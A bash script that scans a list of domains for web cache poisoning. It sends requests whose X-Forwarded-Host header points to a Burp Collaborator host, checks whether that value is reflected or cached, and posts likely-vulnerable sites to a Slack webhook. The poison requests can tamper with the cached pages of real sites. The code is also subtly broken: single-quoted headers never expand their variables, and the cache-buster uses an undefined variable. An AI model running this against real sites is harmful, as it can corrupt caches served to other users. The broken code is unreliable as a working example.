#!/bin/bash
# author: sambal0x
# Purpose: To quickly check for potential CDN cache poisoning issues for a list of URLs
#          This just assumes that the unkeyed header is X-Forwarded-Host, but its just to check for low hanging fruits
#          Disclaimer : Use at your own risk!
#          Reference: https://hackerone.com/reports/409370 , https://portswigger.net/research/practical-web-cache-poisoning
# 		
#################################################

#!/bin/bash

TIMEOUT=4 # seconds
BURPCOL=w63ogwjvhnvnb5rqcyddg6zhu801oq.burpcollaborator.net
SLACKHOOK=https://hooks.slack.com/services/TNZZT6H/BPW36KAaZ/Vf1OApKlXXXXX
TIMESTAMP=$(date +%s)
REFLECT=qwertyuiop

RED='\033[0;31m'
NC='\033[0m' # No Color

for domain in $(cat $1); do 
	baseline=$(curl -m $TIMEOUT -k -s -o /dev/null -w "%{http_code}" https://$domain )  # baseline
	s1=$(curl -m $TIMEOUT -k -s -o /dev/null -w "%{http_code}" -H 'X-Forwarded-Host: $BURPCOL:123' https://$domain?cachebuster=$TIME) # send poison req
	s2=$(curl -m $TIMEOUT -k -s -o /dev/null -w "%{http_code}" https://$domain?cachebuster=$TIME) # check poison req
	reflected=$(curl -i -m 4 -k -s -H 'X-Forwarded-Host: $REFLECT:123' https://$domain?reflect=$TIME | grep -c $REFLECT)  #check if host header reflected
	output="https://$domain, $baseline,$s1, $s2, $reflected"
	echo $output

	# if host header is reflected in response
	if [[ "$reflected" != "0" ]] ; then   
		echo -e  "${RED}[+] https://$domain - host header reflected.. Notifying via Slack${NC}"
		curl -X POST -H 'Content-type: application/json' --data "{'text':'## Reflected host header in response ##\n$output'}" $SLACKHOOK &>/dev/null
	fi	


	# if baseline and poison request not same, and poison request is confirmed -> potentially vulnerable
	if [[ "$baseline" != "$s1"  &&  "$s1" == "$s2"  &&  "$s1" != "000" && "$s2" != "000" && $baseline != "000" ]] ; then   
		echo -e  "${RED}[+] https://$domain is Potentially Vulnerable.. Notifying via Slack${NC}"
		curl -X POST -H 'Content-type: application/json' --data "{'text':'## Potential targets ##\n$output'}" $SLACKHOOK &>/dev/null
	fi
done
